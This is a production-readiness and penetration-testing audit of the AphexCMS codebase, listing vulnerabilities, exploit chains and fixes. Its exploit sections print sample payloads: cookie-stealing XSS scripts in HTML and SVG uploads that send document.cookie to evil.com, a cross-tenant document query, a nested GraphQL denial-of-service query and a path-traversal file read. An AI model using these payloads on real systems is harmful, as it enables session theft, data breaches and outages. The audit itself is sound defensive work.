# AphexCMS V1 Production Readiness Audit

**Date:** 2026-05-09
**Verdict:** Not yet ready for production. ~10 critical issues need to be resolved first.

---

## CRITICAL (Must fix before V1)

### Security

**1. Asset upload IDOR — any user can upload to any org**
`packages/cms-core/src/lib/server/api/routes/assets.ts:117-118` — The upload handler accepts `organizationId` from form data, allowing any authenticated user to inject assets into any organization. Fix: always use `auth.organizationId`.

**2. Local storage path traversal**
`packages/cms-core/src/lib/storage/adapters/local-storage-adapter.ts:87` — Uploaded filenames are passed directly to `path.join()` without sanitizing `../` sequences. A crafted filename can write files outside the storage directory. Fix: strip path separators from filenames.

**3. God-mode data leak**
`apps/studio/src/routes/god-mode/+layout.server.ts` — Returns `{ unauthorized: true }` instead of throwing a redirect. The child `+page.server.ts` still runs `findAllOrganizations()` and the data is accessible via SvelteKit's `__data.json`. Fix: throw `redirect(302)` for non-super_admin.

**4. GraphQL mutation detection bypass**
`packages/cms-core/src/lib/auth/auth-hooks.ts:134-135` — Checks if request body starts with `"mutation"` but standard GraphQL-over-HTTP uses JSON (`{ "query": "mutation { ... }" }`). Read-only API keys can submit mutations. Fix: parse the JSON body and inspect the `query` field.

### Database & Performance

**5. Missing database indexes on all high-traffic columns**
`packages/postgresql-adapter/src/schema.ts` — Only 1 index exists (`idx_doc_refs_ref_id`). Missing indexes on: `documents.organization_id`, `documents.type`, `documents.(org_id, type)` composite, `assets.organization_id`, `organization_members.user_id`, `organization_members.organization_id`, `invitations.email`, `invitations.organization_id`, `document_versions.(document_id, organization_id)`. Every list query is a full table scan.

**6. Asset count fetches up to 999,999 rows into memory**
`packages/cms-core/src/lib/server/api/routes/assets.ts:40-47` — Instead of `COUNT(*)`, the assets list endpoint fetches all assets with `limit: 999999` and reads `.length`. Will cause OOM at scale. Fix: add a `countAssets()` method like documents already has.

**7. N+1 queries in org hierarchy operations**
`packages/postgresql-adapter/src/index.ts:152-260` — Methods like `updateDocDraft`, `deleteDocById`, `publishDoc`, `countDocsByType` loop through child orgs one at a time instead of using `inArray()` in a single query.

### Build & Packaging

**8. Release workflow missing NPM_TOKEN**
`.github/workflows/release.yml` — Only sets `GITHUB_TOKEN`. Publishes will fail with 401/403. Fix: add `NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}`.

**9. `workspace:*` in peerDependencies**
All adapter packages use `workspace:*` which resolves to exact version pins (e.g., `"8.1.0"`). Fix: change to `workspace:^` so consumers get caret ranges (`"^8.1.0"`).

**10. S3 adapter `getSignedUrl()` returns public URL**
`packages/storage-s3/src/index.ts:134` — Stub returns the public URL. Private assets are publicly accessible. Fix: implement AWS Signature V4 or document that only public buckets are supported in V1.

### Operations

**11. No PR CI pipeline**
No workflow runs lint, type-check, build, or tests on pull requests. The only workflows are release and template sync. Fix: add a `ci.yml` workflow.

**12. No health check endpoint**
No `/api/health` route exists. Container orchestrators, load balancers, and uptime monitors all need this.

**13. No observability**
No Sentry, OpenTelemetry, or any error tracking. Production errors only appear in stdout with no alerting.

---

## WARNING (Should fix for V1 or immediately after)

### Security

- No security headers (CSP, X-Frame-Options, HSTS, X-Content-Type-Options) — add via hooks or deployment platform
- SVG files served inline can execute JS — serve with `Content-Disposition: attachment` or sanitize
- No rate limiting on CMS API endpoints (auth endpoints are covered)
- `PATCH /api/instance-settings` has no Zod validation — raw body passed to DB
- Error 500 responses leak `error.message` — use generic text in production
- Password minimum length is 1 character in Zod schema — add `.min(8)`
- `.env` was committed in initial git commit — rotate secrets if still in use

### Database

- Timestamp columns on documents/assets missing `NOT NULL` constraint
- `roles.isBuiltIn` uses `text` instead of `boolean`
- All timestamps use `timestamp` without timezone — should use `timestamptz`
- `acceptInvitation` is not transactional — race condition possible
- `deleteDocumentVersions` bypasses Row-Level Security (no `withOrgContext`)
- `disconnect()` is a no-op — connection pool never drains on shutdown
- No retry logic for transient database failures
- `listAllDocsForOrg` has no pagination (references backfill)

### Code Quality

- ~30+ `console.log` statements in production code paths (RBAC data, schema ops, user IDs)
- Asset adapter silently swallows all DB errors — returns `null`/`[]`/`0` instead of throwing
- `getSchemaForArrayItem` in cleanup.ts is a non-functional placeholder (always returns null)
- ~80+ `any` types across core utilities and components
- Deprecated fields in API types (`docType`, `meta`, `limit`/`offset`) still shipping
- `@aphexcms/cms-core` has orphaned `s3mini` dependency (not imported anywhere)
- Duplicate `@aphexcms/cms-core` in both `dependencies` and `peerDependencies` of email adapters

### Packaging

- No `engines` field in any package.json
- 5 of 8 published packages missing `license` field
- 5 published packages have no README
- `sharp` (35MB native binary) is a hard dependency instead of optional peer dep
- Version numbers are inconsistent (core v8, adapters v11-12, CLI v0.x) — consider coordinated v1.0.0

### Ops

- No Dependabot or Renovate for dependency vulnerability alerts
- No global `app.onError()` on the Hono API
- Logger outputs unstructured text, not JSON
- README still says "Not recommended for production use yet"
- No graceful shutdown handling (connection pool draining, cache flushing)

---

## INFO (Nice to have, post-V1)

- No `updatedAt` auto-update trigger at DB level (app-level only)
- No `.nvmrc` or `.node-version` file
- No unit tests in `cms-core`, `postgresql-adapter`, `storage-s3`, or email adapter packages (all testing is integration via studio)
- No component tests for admin UI
- Svelte 5 migration is **complete** (positive finding)
- CSRF/origin protection properly configured via Better Auth
- Password reset doesn't leak user existence (positive finding)
- File upload magic-byte validation is well-implemented (positive finding)
- Zod validation on mutation endpoints is comprehensive (positive finding)
- Changesets, lockfile, and TypeScript strict mode are all properly configured (positive finding)

---

## Recommended V1 Punch List (in priority order)

| # | Issue | Effort |
|---|-------|--------|
| 1 | Fix asset upload IDOR (use `auth.organizationId`) | 5 min |
| 2 | Sanitize filenames in local storage adapter | 15 min |
| 3 | Fix god-mode to throw redirect | 5 min |
| 4 | Fix GraphQL mutation detection (parse JSON body) | 30 min |
| 5 | Add database indexes | 1 hr |
| 6 | Replace asset count with `COUNT(*)` query | 30 min |
| 7 | Fix N+1 queries in org hierarchy methods | 2 hr |
| 8 | Add `NODE_AUTH_TOKEN` to release workflow | 5 min |
| 9 | Change `workspace:*` to `workspace:^` in peer deps | 10 min |
| 10 | Document S3 signed URL limitation or implement it | 30 min–2 hr |
| 11 | Add CI workflow for PRs | 30 min |
| 12 | Add `/api/health` endpoint | 30 min |
| 13 | Add security headers | 30 min |
| 14 | Remove debug console.logs from production paths | 1 hr |
| 15 | Add basic error tracking (Sentry or similar) | 1–2 hr |

---
---

# Deep Security Audit — Exploit Analysis

**Date:** 2026-05-09

This section documents findings from a deeper penetration-testing pass that traced actual exploit chains through the code rather than static analysis alone.

---

## NEW CRITICAL Findings

### 14. Cross-org data exfiltration via `filterOrganizationIds`

**Files:** `packages/cms-core/src/lib/server/api/routes/documents.ts:39`, `packages/cms-core/src/lib/api/schemas/documents.ts:54-59`, `packages/cms-core/src/lib/server/api/routes/documents-query.ts:63-64`

The `filterOrganizationIds` parameter is accepted directly from user input (CSV query param on GET, JSON array on POST `/documents/query`) and passed to the database adapter **without any authorization check**. The adapter uses `inArray()` with these user-supplied org IDs, completely replacing the normal org-scoped access control. When `filterOrganizationIds` is set, `withOrgContext()` (RLS) is skipped entirely.

**Exploit:**
```
GET /api/documents?type=page&filterOrganizationIds=target-org-uuid-1,target-org-uuid-2
```
Any authenticated user can read all documents from any organization. **This is a full cross-tenant data breach.**

**Fix:** Remove `filterOrganizationIds` from the Zod request schemas. This parameter should only be set server-side by the HierarchyService, never accepted from client input.

### 15. Stored XSS via HTML file upload

**Files:** `packages/cms-core/src/lib/utils/mime-detect.ts:140-170`, `packages/cms-core/src/lib/routes/assets-cdn.ts:146`

`.html`, `.htm`, `.xhtml`, `.shtml`, `.xml`, `.xsl`, `.mhtml` are NOT in the blocked extensions list. HTML has no magic bytes, so `detectMimeType()` returns `null` and all validation passes. The client-provided MIME type (`text/html`) is stored and used as `Content-Type` when serving. Files are served with `Content-Disposition: inline`.

**Exploit:**
1. Upload `payload.html` with `Content-Type: text/html` containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
2. All checks pass (no magic bytes, `.html` not blocked)
3. Served at `/media/{id}/payload.html` as `text/html` inline
4. Any user who visits that URL has their session stolen

**Fix:** Add `.html`, `.htm`, `.xhtml`, `.shtml`, `.xml`, `.xsl`, `.mhtml` to `BLOCKED_EXTENSIONS`. Add `text/html`, `application/xhtml+xml`, `text/xml`, `application/xml` to `BLOCKED_MIME_TYPES`.

### 16. Stored XSS via SVG upload (full session hijack)

**Files:** `packages/cms-core/src/lib/utils/mime-detect.ts:61-65`, `packages/cms-core/src/lib/routes/assets-cdn.ts:145-153`

SVG files are detected as `image/svg+xml` but are NOT blocked. Served with `Content-Type: image/svg+xml` and `Content-Disposition: inline` from the same origin as the admin UI. No `X-Content-Type-Options: nosniff` header.

**Exploit:**
1. Upload `evil.svg` containing `<svg xmlns="..."><script>document.location='https://evil.com/steal?c='+document.cookie</script></svg>`
2. Passes all checks — SVG is a valid image type
3. Served inline from the CMS domain — embedded JS executes with full access to admin session cookies

**Fix:** Either block SVG uploads, serve SVGs with `Content-Security-Policy: script-src 'none'`, sanitize SVG content on upload, or serve all user-uploaded content from a separate cookieless domain.

---

## NEW HIGH Findings

### 17. Client-provided MIME type used as Content-Type (root cause of XSS)

**File:** `packages/cms-core/src/lib/routes/assets-cdn.ts:146`

`asset.mimeType` is set from `file.type` (client-provided) at upload time and used directly as the `Content-Type` response header when serving. For file types where `detectMimeType()` returns `null` (HTML, CSS, XML, JSON, JS, etc.), the client controls the served Content-Type without any override.

**Exploit:** Upload a file containing `<script>alert(1)</script>` with filename `data.txt` but set the request MIME type to `text/html`. Extension `.txt` is not blocked, `detectMimeType` returns `null`, file is stored with `mimeType: "text/html"` and served as HTML.

**Fix:** When `detectMimeType` returns non-null, use the detected type. When it returns `null`, default to `application/octet-stream` instead of trusting the client.

### 18. `getObject` reads arbitrary filesystem paths

**File:** `packages/cms-core/src/lib/storage/adapters/local-storage-adapter.ts:117-119`

```typescript
async getObject(path: string): Promise<Buffer> {
    return await readFile(path);
}
```

The `path` comes from `asset.path` in the database (set during upload). Combined with the path traversal in Finding 2, an attacker stores a traversed path in the DB, then the CDN serves arbitrary files from the server (`.env`, private keys, `/etc/passwd`).

**Fix:** Validate that the resolved path starts with the configured `basePath` before reading.

### 19. Missing capability checks on all asset routes — viewers can upload/delete

**Files:** `packages/cms-core/src/lib/server/api/routes/assets.ts`, `assets-by-id.ts`, `assets-bulk.ts`

Asset routes check `auth` exists and `type !== 'partial_session'` but do NOT use `hasCapability()`. The auth-hooks middleware only blocks writes for `api_key` auth types, not session-based users. A user with the `viewer` role (who should only have `document.read` and `asset.read`) can:
- Upload assets (`POST /api/assets`)
- Delete assets (`DELETE /api/assets/:id`)
- Update asset metadata (`PATCH /api/assets/:id`)
- Bulk delete assets (`DELETE /api/assets/bulk`)

**Fix:** Add `hasCapability(auth, 'asset.upload')`, `hasCapability(auth, 'asset.delete')`, etc. to each asset route handler.

### 20. Version restore bypasses permission checks

**File:** `packages/cms-core/src/lib/server/api/routes/document-versions.ts:114-157`

`POST /:id/versions/:version/restore` calls `versionService.restoreVersion()` directly, bypassing the CollectionAPI's `canUpdate` permission check. A viewer can restore documents to previous versions.

**Fix:** Add `hasCapability(auth, 'document.update')` check before the restore call.

### 21. Unbounded JSONB payload size — no request body limit

**File:** `packages/cms-core/src/lib/api/schemas/documents.ts:3`

`draftData` is `z.record(z.string(), z.unknown())` — accepts any JSON object of any size. No body size limit at the application level. A 100MB+ JSON payload will be fully parsed and written to the database.

**Fix:** Configure body size limits at the SvelteKit/Hono/reverse proxy level (e.g., 10MB max).

### 22. No rate limits on document creation, publishing, or org creation

**Files:** `packages/cms-core/src/lib/server/api/routes/documents.ts`, `organizations.ts`

No rate limiting on any CMS write endpoint. An attacker can:
- Create thousands of documents per second
- Publish/unpublish rapidly (each creates a version entry + triggers retention enforcement = 3+ DB ops per request)
- Create unlimited organizations (super_admin only, but if compromised, instant DoS)

**Fix:** Add rate limiting middleware to write endpoints, at minimum document create/update and publish.

### 23. GraphQL query depth and complexity not limited

**Files:** `packages/cms-core/src/lib/graphql/index.ts:51-107`, `packages/cms-core/src/lib/graphql/resolvers.ts:526-594`

No depth limiting, complexity analysis, or field count restrictions on the GraphQL endpoint. The `depth` argument on individual queries has no server-side max in the GraphQL layer (the Zod schema caps at 5 for REST, but GraphQL bypasses it). The `limit` argument has no server-side max either.

**Exploit:**
```graphql
{
  allPage(limit: 999999) {
    id
    references {
      allPage(limit: 999999) {
        id
        references { ... }
      }
    }
  }
}
```

**Fix:** Add `@graphql-yoga/plugin-query-depth-limiting` and complexity analysis to the Yoga config.

---

## NEW MEDIUM Findings

### 24. Sessions not revoked on password reset

**File:** `apps/studio/src/lib/server/auth/better-auth/instance.ts`

`revokeSessionsOnPasswordReset` is not set (defaults to `false`). After a password reset (e.g., post-compromise), existing attacker sessions remain valid until natural expiry.

**Fix:** Add `revokeSessionsOnPasswordReset: true` to the `emailAndPassword` config.

### 25. Stack traces exposed in GraphQL error responses

**File:** `packages/cms-core/src/lib/graphql/resolvers.ts` — lines 418, 438, 458, 646, 707, 740, 794, 848

Multiple mutation error handlers include `originalError: (error as Error).stack` in GraphQL extensions, leaking server file paths, function names, and implementation details to any authenticated API consumer.

**Fix:** Remove `originalError: (error as Error).stack` from production, or gate behind `NODE_ENV === 'development'`.

### 26. Upload size controlled by client, not server

**File:** `packages/cms-core/src/lib/server/api/routes/assets.ts:95-97`

`maxSize` and `allowedMimeTypes` are read from form data (client-supplied). The entire file is read into memory (`file.arrayBuffer()`) before any size check. An attacker sends `maxSize: 999999999999` and uploads a 500MB file — the server buffers it all before rejecting.

**Fix:** Enforce a server-side max file size independent of client input. Add body size limits at the framework level.

### 27. Double extension bypass for blocked extensions

**File:** `packages/cms-core/src/lib/utils/mime-detect.ts:195`

Extension check uses `filename.lastIndexOf('.')`, so `payload.html.pdf` extracts `.pdf` (not blocked). Combined with no magic bytes for HTML, the file passes all checks.

**Fix:** Check all extensions in the filename, not just the last one.

### 28. Sharp decompression bomb — no pixel limit configured

**File:** `packages/cms-core/src/lib/services/asset-service.ts:59-77`

`sharp(data.buffer).metadata()` and `sharp(data.buffer).stats()` run without custom `limitInputPixels`. A 1KB PNG that decompresses to 16000x16000 pixels forces sharp to decode ~768MB of raw pixel data. Multiple concurrent uploads of crafted images can exhaust server memory.

**Fix:** Set `limitInputPixels` to 100MP or lower. Add image dimension validation before processing.

### 29. Invitation cancellation is cross-org

**File:** `packages/cms-core/src/lib/server/api/routes/organizations-invitations.ts:156-219`

`DELETE /organizations/invitations` checks `hasCapability(auth, 'member.invite')` but does NOT verify the invitation belongs to `auth.organizationId`. An admin in Org A can delete pending invitations in Org B if they know the invitation ID.

**Fix:** Filter by `auth.organizationId` when looking up the invitation to delete.

### 30. Email enumeration via invitation system

**File:** `packages/cms-core/src/lib/server/api/routes/organizations-invitations.ts:85-103`

The invitation endpoint returns "Already a member" or "Already invited" — revealing whether an email belongs to an existing user. Requires `member.invite` capability.

### 31. Unbounded bulk asset delete

**File:** `packages/cms-core/src/lib/api/schemas/assets.ts:89-91`

`bulkDeleteAssetsRequest.ids` has `.min(1)` but no `.max()`. An attacker can send thousands of IDs in one request, causing sequential deletion and a long-running request.

**Fix:** Add `.max(100)` to the IDs array.

### 32. Organization deletion leaves orphaned data

**File:** `packages/cms-core/src/lib/server/api/routes/organizations-by-id.ts:165-239`

Deleting an org removes members and invitations but NOT documents, assets, versions, roles, or reference index entries. Orphaned data wastes storage and could leak if org IDs are reused.

### 33. Race conditions

- **Concurrent version restore** (`version-service.ts:106-147`): No optimistic concurrency control. Two concurrent restores silently overwrite each other — the second restore silently destroys edits made between the two operations.
- **Invitation acceptance** (`organization-adapter.ts:224-266`): TOCTOU gap — two users can accept the same invitation simultaneously if no unique constraint on `(userId, organizationId)`.
- **Concurrent publish** (`collection-api.ts:670-741`): Two simultaneous publishes create duplicate version entries.

### 34. `sql.raw()` with unvalidated userId and userRole

**File:** `packages/postgresql-adapter/src/index.ts:709-713`

`withOrgContext()` validates `organizationId` via UUID regex before `sql.raw()` interpolation, but `userId` and `userRole` are interpolated without validation. These come from trusted auth data, but defense-in-depth calls for validating them too.

---

## Password Security — Positive Findings

The password audit found **no exploitable password exposure vectors**:

- Passwords stored using **scrypt** (N=16384, r=16, p=1, 64-byte key) with per-password 16-byte random salt via Better Auth
- Password hashes live in the `account` table, never queried by application code
- All user queries use explicit column selection — no `SELECT *` that could leak hashes
- No password values in logs, error messages, session data, cookies, or client-side code
- Constant-time comparison for password verification (`constantTimeEqual()`)
- Timing-safe user enumeration mitigations on sign-in and password reset flows
- Password reset tokens are cryptographically random, single-use, expire in 1 hour, rate-limited to 2/60s
- GraphQL schema has no access to auth tables

---

## Updated V1 Punch List (Priority Order)

| # | Issue | Severity | Effort |
|---|-------|----------|--------|
| 1 | Remove `filterOrganizationIds` from client-facing Zod schemas | CRITICAL | 15 min |
| 2 | Fix asset upload IDOR (use `auth.organizationId`) | CRITICAL | 5 min |
| 3 | Block HTML/SVG uploads or serve from separate domain | CRITICAL | 30 min |
| 4 | Sanitize filenames in local storage adapter | CRITICAL | 15 min |
| 5 | Validate `getObject` path stays within basePath | HIGH | 15 min |
| 6 | Override client MIME type — default to `application/octet-stream` when undetected | HIGH | 30 min |
| 7 | Add `X-Content-Type-Options: nosniff` + security headers | HIGH | 30 min |
| 8 | Fix god-mode to throw redirect | CRITICAL | 5 min |
| 9 | Fix GraphQL mutation detection (parse JSON body) | CRITICAL | 30 min |
| 10 | Add `hasCapability` checks to asset routes | HIGH | 30 min |
| 11 | Add `hasCapability` check to version restore | HIGH | 15 min |
| 12 | Add database indexes | CRITICAL | 1 hr |
| 13 | Replace asset count with `COUNT(*)` query | CRITICAL | 30 min |
| 14 | Fix N+1 queries in org hierarchy methods | CRITICAL | 2 hr |
| 15 | Add `NODE_AUTH_TOKEN` to release workflow | CRITICAL | 5 min |
| 16 | Change `workspace:*` to `workspace:^` in peer deps | CRITICAL | 10 min |
| 17 | Add request body size limits | HIGH | 15 min |
| 18 | Add rate limiting on write endpoints | HIGH | 1-2 hr |
| 19 | Add GraphQL depth/complexity limiting | HIGH | 30 min |
| 20 | Enable `revokeSessionsOnPasswordReset` | MEDIUM | 5 min |
| 21 | Remove stack traces from GraphQL error responses | MEDIUM | 30 min |
| 22 | Server-side file size enforcement (don't trust client `maxSize`) | MEDIUM | 30 min |
| 23 | Add CI workflow for PRs | CRITICAL | 30 min |
| 24 | Add `/api/health` endpoint | CRITICAL | 30 min |
| 25 | Add basic error tracking (Sentry or similar) | CRITICAL | 1-2 hr |
| 26 | Remove debug console.logs from production paths | WARNING | 1 hr |
| 27 | Add `.max(100)` to bulk delete schema | MEDIUM | 5 min |
| 28 | Fix invitation cancellation cross-org check | MEDIUM | 15 min |
| 29 | Configure sharp `limitInputPixels` | MEDIUM | 10 min |
| 30 | Document S3 signed URL limitation or implement it | HIGH | 30 min–2 hr |
